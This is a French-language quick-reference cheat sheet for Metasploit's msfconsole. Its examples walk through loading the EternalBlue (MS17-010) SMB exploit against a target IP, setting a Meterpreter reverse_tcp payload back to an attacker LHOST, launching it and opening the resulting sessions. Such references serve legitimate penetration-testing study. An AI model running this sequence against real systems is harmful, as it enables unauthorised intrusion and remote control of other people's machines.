# cheat sheet msfconsole

Une référence rapide pour les commandes courantes de **msfconsole**, l’interface principale de Metasploit Framework, avec fonctions, commandes et exemples pratiques.

---

## 1. Lancer msfconsole
**Fonction** : Démarrer l’interface Metasploit.  
**Commande** : `msfconsole`  
**Exemple** : `msfconsole`  
- Ouvre la console Metasploit avec le prompt "msf6 >".

---

## 2. Rechercher un exploit
**Fonction** : Trouver un exploit spécifique.  
**Commande** : `search <keyword>`  
**Exemple** : `search eternalblue`  
- Liste les exploits liés à "eternalblue" (ex. : MS17-010).

---

## 3. Utiliser un exploit
**Fonction** : Sélectionner un exploit à configurer.  
**Commande** : `use <exploit_path>`  
**Exemple** : `use exploit/windows/smb/ms17_010_eternalblue`  
- Charge l’exploit EternalBlue pour Windows SMB.

---

## 4. Afficher les options d’un exploit
**Fonction** : Voir les paramètres requis/configurables.  
**Commande** : `show options`  
**Exemple** : `show options`  
- Affiche les options comme RHOSTS, RPORT pour l’exploit sélectionné.

---

## 5. Définir une cible
**Fonction** : Configurer l’adresse IP de la cible.  
**Commande** : `set RHOSTS <target_ip>`  
**Exemple** : `set RHOSTS 192.168.1.10`  
- Définit la cible à attaquer sur 192.168.1.10.

---

## 6. Choisir un payload
**Fonction** : Sélectionner un payload pour l’exploit.  
**Commande** : `set PAYLOAD <payload_path>`  
**Exemple** : `set PAYLOAD windows/meterpreter/reverse_tcp`  
- Utilise un payload Meterpreter avec connexion reverse TCP.

---

## 7. Configurer l’hôte local
**Fonction** : Définir l’IP de l’attaquant pour le payload.  
**Commande** : `set LHOST <local_ip>`  
**Exemple** : `set LHOST 192.168.1.100`  
- Définit l’IP de l’attaquant pour recevoir la connexion.

---

## 8. Lancer l’exploit
**Fonction** : Exécuter l’exploit contre la cible.  
**Commande** : `exploit` ou `run`  
**Exemple** : `exploit`  
- Lance l’exploit configuré (ex. : EternalBlue) et ouvre une session si réussi.

---

## 9. Lister les sessions actives
**Fonction** : Voir les sessions Meterpreter ou shell ouvertes.  
**Commande** : `sessions`  
**Exemple** : `sessions`  
- Affiche les ID des sessions actives (ex. : 1, 2).

---

## 10. Interagir avec une session
**Fonction** : Accéder à une session spécifique (ex. : Meterpreter).  
**Commande** : `sessions -i <session_id>`  
**Exemple** : `sessions -i 1`  
- Ouvre la session avec l’ID 1 pour interagir (ex. : Meterpreter).

---

## Notes importantes
- **Prérequis** : Metasploit Framework installé.
- **Installation** :  
  ```bash
  sudo apt update && sudo apt install -y metasploit-framework
